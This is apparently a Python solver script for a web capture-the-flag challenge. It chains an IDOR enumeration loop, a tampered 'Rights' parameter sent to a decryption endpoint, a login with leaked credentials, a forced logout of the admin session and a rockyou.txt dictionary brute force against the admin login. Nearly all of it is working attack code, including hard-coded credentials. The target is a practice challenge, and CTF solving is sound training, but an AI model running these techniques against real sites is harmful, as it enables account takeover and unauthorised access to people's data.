# Full Solver for the webchallenge made by M58 and PauvreTimo

import requests

domain = "https://ez1.cyberlog.dev"


print("=====================")
print("IDOR under https://ez1.cyberlog.dev/Internal__Directory?user=")
print("=====================\n")

# URL = "https://ez1.cyberlog.dev/Internal__Directory?user="
# r = requests.Session()
# i = 0
# while True:
#     url = URL + str(i)
#     response = r.get(url)
#     if "Secret" in response.text:
#         print("Profil found with id " + str(i))
#         i += 1
#         continue
#     else :
#         i += 1
#     if i == 500:
#         break

print("\n=====================")
print("Retrieving secret under Profil n° 458")
print("=====================\n")

URL2 = "https://ez1.cyberlog.dev/DecryptSecret"
datastobesend = {"Rights": "1", "EncryptedHash": "oAeCisG7B6YSTb5pMN0M69UU5WqCSIL0"}
r2 = requests.Session()
response2 = r2.post(url=URL2, data=datastobesend)
print(response2.text)


print("\n=====================")
print("Connexion on https://ez1.cyberlog.dev/loginINTRA")
print("=====================\n")

URL3 = "https://ez1.cyberlog.dev/loginINTRA"
datastobesend = {"username": "Secret", "password": "SuperSecurePassword!!))(("}
r3 = requests.Session()
response3 = r3.post(url=URL3, data=datastobesend)
if response3.status_code == 200:
    print("Connexion successfull !\n")
else:
    print("Connexion failed !\n")


print("\n=====================")
print("Forcing deconnexion of the admin session")
print("=====================\n")

URL4 = "https://ez1.cyberlog.dev/Deconnect"
datastobesend = {"User":"WebsiteAdmin"}
r4 = requests.Session()
response4 = r4.post(url=URL4, data=datastobesend)
if response4.text == "OK":
    print("Deconnexion successfull !\n")
else:
    print("Deconnexion failed !\n")


print("\n=====================")
print("Brute forcing the admin password")
print("=====================\n")

URL = "https://ez1.cyberlog.dev/loginADMIN2"
dico = "/home/student/Téléchargements/rockyou.txt"

# PARAMS = {'username': 'WebsiteAdmin', 'password': ''}

# with requests.Session() as session:
#     r = session.post(url=URL, data=PARAMS)
#     if r.text == "Wrong password or username":
#         line_number = 0
#         with open(dico, 'r', encoding='utf-8', errors='ignore') as file:
#             for line in file:
#                 line_number += 1
#                 print("Trying password n°" + str(line_number))
#                 PARAMS['password'] = line.strip()
#                 r = session.post(url=URL, data=PARAMS)
#                 # If no redirection, the password is correct
#                 if "CLOG" in r.text:
#                     print("Password found: " + line.strip())
#                     # Store the password
#                     password = line.strip()
#                     break   

# print(password)



password = "sexymama"
print("\n=====================")
print("Connexion on https://ez1.cyberlog.dev/loginADMIN2")
print("=====================\n")

URL5 = "https://ez1.cyberlog.dev/loginADMIN2"
datastobesend = {"username": "WebsiteAdmin", "password": password}
r5 = requests.Session()
response5 = r5.post(url=URL5, data=datastobesend)
print("This should print the password : ")
print(response5.text)

print("This should print incorrect password : ")
import time
time.sleep(4)
r6 = requests.Session()
# request https://ez1.cyberlog.dev/login
response6 = r6.get("https://ez1.cyberlog.dev/login")
r7 = requests.Session()
response7 = r7.post(url=URL5, data=datastobesend)
print(response7.text)



